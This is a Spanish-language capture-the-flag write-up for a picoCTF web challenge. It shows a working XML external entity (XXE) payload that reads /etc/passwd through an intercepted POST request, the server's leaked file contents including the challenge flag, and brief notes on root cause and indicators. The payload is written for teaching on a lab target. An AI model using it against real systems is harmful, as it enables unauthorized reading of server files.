**Reto**
	

**Descripción**
	The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:53853/)

**Solución**
	1. Interceptar la petición:
		Se utilizó **Burp Suite** para interceptar la solicitud enviada al endpoint.
		POST /data
		Content-Type: application/xml
/		
	2. Inyección XXE:
		Se modificó el cuerpo del XML agregando una entidad externa:
		`<?xml version="1.0" encoding="UTF-8"?>`
		`<!DOCTYPE data [`
		  `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
		`]>`
		&xxe; inserta el contenido del archivo dentro del XML procesado.

		Explicación:
		`<!DOCTYPE>` permite definir entidades.    
		`<!ENTITY xxe SYSTEM "file:///etc/passwd">` intenta leer un archivo local del servidor.    
		`&xxe;` inserta el contenido del archivo dentro del XML procesado.
		
			POST /data HTTP/1.1
			Host: saturn.picoctf.net:53853
			User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
			Accept: */*
			Accept-Language: en-US,en;q=0.5
			Accept-Encoding: gzip, deflate, br
			Referer: http://saturn.picoctf.net:53853/
			Content-Type: application/xml
			Content-Length: 134
			Origin: http://saturn.picoctf.net:53853
			Connection: keep-alive
			Priority: u=0
			
			<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE data [
			  <!ENTITY xxe SYSTEM "file:///etc/passwd">
			]>
			<data><ID>&xxe;</ID></data>
/
	3. Respuesta del servidor
		El servidor respondió mostrando el contenido de `/etc/passwd`, confirmando la vulnerabilidad:
		
		HTTP/1.1 200 OK
		Server: Werkzeug/2.3.6 Python/3.8.10
		Date: Wed, 04 Mar 2026 03:58:37 GMT
		Content-Type: text/html; charset=utf-8
		Content-Length: 1023
		Connection: close
		
		Invalid ID: root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		bin:x:2:2:bin:/bin:/usr/sbin/nologin
		sys:x:3:3:sys:/dev:/usr/sbin/nologin
		sync:x:4:65534:sync:/bin:/bin/sync
		games:x:5:60:games:/usr/games:/usr/sbin/nologin
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
		irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
		gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
		_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
		flask:x:999:999::/app:/bin/sh
		picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}


**Notes**
	La aplicación usaba `application/xml` sin deshabilitar entidades externas.
	El parser XML del backend procesaba `DOCTYPE`.
	XXE permite:
	    Leer archivos locales
	    Hacer SSRF
	    Enumerar el sistema
	Indicadores de posible XXE:
		Acepta XML
		Permite `DOCTYPE`
		Devuelve contenido procesado directamente

**Referencias**
	